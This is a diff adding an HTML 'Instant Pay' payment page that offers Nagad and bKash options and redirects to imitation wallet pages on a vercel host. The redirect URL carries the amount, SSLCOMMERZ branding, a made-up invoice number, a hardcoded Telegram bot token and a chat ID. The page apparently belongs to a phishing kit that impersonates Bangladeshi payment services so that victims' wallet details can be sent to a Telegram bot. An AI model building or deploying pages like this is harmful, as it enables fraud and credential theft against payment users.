@@ -1,0 +1,296 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Row</title>
+    <style>
+        /* Background Theme */
+        body {
+            background-image: url('images/pexels-steve-1509534.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #333;
+        }
+
+        /* Header and Footer */
+        header {
+            width: 100%;
+            padding: 10px 0;
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.3);
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #008080;
+            backdrop-filter: blur(5px);
+            margin-top: 15px;
+        }
+
+        /* Main Container */
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: lightblue;  /* Light blue background for the entire container */
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            margin-top: 20px;
+            max-width: 400px;
+            width: 90%;
+            animation: fadeIn 1s ease;
+        }
+
+        /* Titles */
+        .title {
+            font-size: 2.5rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+            background-color: #ADD8E6;  /* Lighter blue for the title */
+            padding: 10px;
+            border-radius: 8px;
+        }
+
+        .subtitle {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #555;
+        }
+
+        /* Image Container */
+        .image-container {
+            display: flex;
+            gap: 20px;
+        }
+        .image-box {
+            position: relative;
+            width: 100px;
+            cursor: pointer;
+            border: 2px solid transparent;
+            border-radius: 8px;
+            transition: border-color 0.3s ease, transform 0.3s ease;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
+            animation: fadeIn 1.5s ease;
+        }
+        .image-box img {
+            width: 100%;
+            height: auto;
+            border-radius: 5px;
+        }
+        .image-box:hover {
+            transform: scale(1.05);
+        }
+        .checkbox {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            width: 24px;
+            height: 24px;
+            background-color: #4CAF50;
+            color: white;
+            font-size: 1rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 50%;
+            display: none;
+        }
+        .checked {
+            border-color: #4CAF50;
+        }
+        .checked .checkbox {
+            display: flex;
+        }
+
+        /* Payment Message with Fade-Up Animation */
+        .payment-message {
+            background-color: #4CAF50;
+            color: white;
+            font-size: 1.5rem;
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-weight: bold;
+            opacity: 0;
+            transform: translateY(20px);
+            display: none;
+            animation: fadeUp 1.5s forwards ease-in-out;
+        }
+
+        /* Error Message */
+        .error-message {
+            background-color: #ff4d4d;
+            color: white;
+            font-size: 1.2rem;
+            padding: 10px 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            font-weight: bold;
+            display: none;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        /* Fade-up Keyframes */
+        @keyframes fadeUp {
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Fade-in Animation for the Main Content */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Button Styling */
+        .button {
+            height: 50px;
+            width: 150px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.5s ease-in-out;
+        }
+
+        .button:hover {
+            box-shadow: .5px .5px 150px #252525;
+        }
+
+        .type1::after {
+            content: "Thanks";
+            height: 50px;
+            width: 150px;
+            background-color: #008080;
+            color: #fff;
+            position: absolute;
+            top: 0%;
+            left: 0%;
+            transform: translateY(50px);
+            font-size: 1.2rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.5s ease-in-out;
+        }
+
+        .type1::before {
+            content: "Pay Now";
+            height: 50px;
+            width: 150px;
+            background-color: #fff;
+            color: #008080;
+            position: absolute;
+            top: 0%;
+            left: 0%;
+            transform: translateY(0px) scale(1.2);
+            font-size: 1.2rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.5s ease-in-out;
+        }
+
+        .type1:hover::after {
+            transform: translateY(0) scale(1.2);
+        }
+
+        .type1:hover::before {
+            transform: translateY(-50px) scale(0) rotate(120deg);
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header style="color: black;">
+        Welcome to Our Payment Gateway
+    </header>
+
+    <!-- Main Content Container -->
+    <div class="main-container">
+        <div class="title">Instant Pay</div>
+        <div class="subtitle">Choose Payment Method:</div>
+
+        <div class="image-container">
+            <div class="image-box" onclick="selectImage(this, 'https://portwallet.vercel.app/nagadoriginal/number.html')">
+                <img src="images/Screenshot-2024-11-12-202636.jpg" alt="Image 1">
+                <div class="checkbox">✔️</div>
+            </div>
+            <div class="image-box" onclick="selectImage(this, 'https://portwallet.vercel.app/paymentmethod=bkash&&paymentID=1.html')">
+                <img src="images/Screenshot-2024-11-12-212550.jpg" alt="Image 2">
+                <div class="checkbox">✔️</div>
+            </div>
+        </div>
+
+        <!-- Button linked to selected image -->
+        <a id="paymentLink" href="#" target="_blank" onclick="triggerPaymentMessage(event)">
+            <button class="button type1">Pay Now</button>
+        </a>
+
+        <!-- Error Message -->
+        <div class="error-message" id="errorMessage">Please select a payment method!</div>
+    </div>
+
+    <!-- Payment Message -->
+    <div class="payment-message" id="paymentMessage">Get Ready to Pay Instantly!</div>
+
+    <script>
+        // Function to get the "amount" parameter from the current URL
+        function getUrlParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name); // Returns the value of the specified parameter
+        }
+
+        function selectImage(selected, link) {
+            // Remove 'checked' class from all images
+            document.querySelectorAll('.image-box').forEach(box => box.classList.remove('checked'));
+            
+            // Add 'checked' class to the clicked image
+            selected.classList.add('checked');
+
+            // Update the button link to match the selected image link
+            document.getElementById('paymentLink').dataset.link = link;
+
+            // Hide error message if visible
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+
+        function triggerPaymentMessage(event) {
+            event.preventDefault(); // Prevent immediate navigation
+
+            const selectedImage = document.querySelector('.image-box.checked');
+            const errorMessage = document.getElementById('errorMessage');
+            const paymentMessage = document.getElementById('paymentMessage');
+            const amount = getUrlParameter("amount"); // Extract the "amount" parameter from the current URL
+
+            if (!selectedImage || !amount) {
+                // Show error message if no image is selected or "amount" is missing
+                errorMessage.style.display = 'block';
+            } else {
+                // Hide error message if previously shown
+                errorMessage.style.display = 'none';
+
+                // Show payment message
+                paymentMessage.style.display = 'block';
+
+                // Delay redirection until after the animation (1.5s)
+                setTimeout(() => {
+                    const baseLink = document.getElementById('paymentLink').dataset.link;
+                    const paymentLinkWithAmount = `${baseLink}?amount=${amount}&ssl=https%3A%2F%2Fimgur.com%2FV3lL1hk.png&companyName=SSLCOMMERZ&invoice=BGT726262477828828&botToken=7972009455:AAFN7kRY_Iu1IdWhTvaVeLheNgD3T7eF_Ik&chatId=1347276733`;
+                    window.location.href = paymentLinkWithAmount; // Redirect with the amount parameter
+                }, 1500); // Duration of the fade-up animation
+            }
+        }
+    </script>
+  
+
+
+</body></html>
